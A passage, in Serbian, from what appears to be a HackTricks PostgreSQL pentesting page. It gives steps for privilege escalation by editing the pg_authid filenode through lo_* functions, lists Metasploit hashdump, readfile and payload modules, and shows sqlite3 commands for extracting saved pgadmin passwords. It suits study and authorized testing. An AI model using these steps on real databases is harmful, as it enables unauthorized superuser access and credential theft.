2. Nabavite relativnu putanju do filenode-a, povezanog sa `pg_authid` tabelom
3. Preuzmite filenode putem `lo_*` funkcija
4. Dobijte tip podataka, povezan sa `pg_authid` tabelom
5. Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [izmenite filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); postavite sve `rol*` boolean zastavice na 1 za pune dozvole.
6. Ponovo otpremite izmenjeni filenode putem `lo_*` funkcija, i prepišite originalni fajl na disku
7. _(Opcionalno)_ Očistite keš tabele u memoriji pokretanjem skupe SQL upita
8. Sada biste trebali imati privilegije punog superadmina.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Unutar _**postgresql.conf**_ fajla možete omogućiti postgresql logove menjajući:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Zatim, **ponovo pokrenite uslugu**.

### pgadmin

[pgadmin](https://www.pgadmin.org) je platforma za administraciju i razvoj za PostgreSQL.\
Možete pronaći **lozinke** unutar _**pgadmin4.db**_ datoteke\
Možete ih dekriptovati koristeći _**decrypt**_ funkciju unutar skripte: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Klijent autentifikacija u PostgreSQL-u se upravlja kroz konfiguracioni fajl pod nazivom **pg_hba.conf**. Ovaj fajl sadrži niz zapisa, od kojih svaki specificira tip veze, opseg IP adresa klijenta (ako je primenljivo), naziv baze podataka, korisničko ime i metodu autentifikacije koja će se koristiti za usklađivanje veza. Prvi zapis koji odgovara tipu veze, adresi klijenta, traženoj bazi podataka i korisničkom imenu se koristi za autentifikaciju. Nema rezervne ili alternativne opcije ako autentifikacija ne uspe. Ako nijedan zapis ne odgovara, pristup je odbijen.

Dostupne metode autentifikacije zasnovane na lozinkama u pg_hba.conf su **md5**, **crypt** i **password**. Ove metode se razlikuju po tome kako se lozinka prenosi: MD5-hasheva, crypt-enkriptovana ili u čistom tekstu. Važno je napomenuti da se crypt metoda ne može koristiti sa lozinkama koje su enkriptovane u pg_authid.

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim **alatom** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
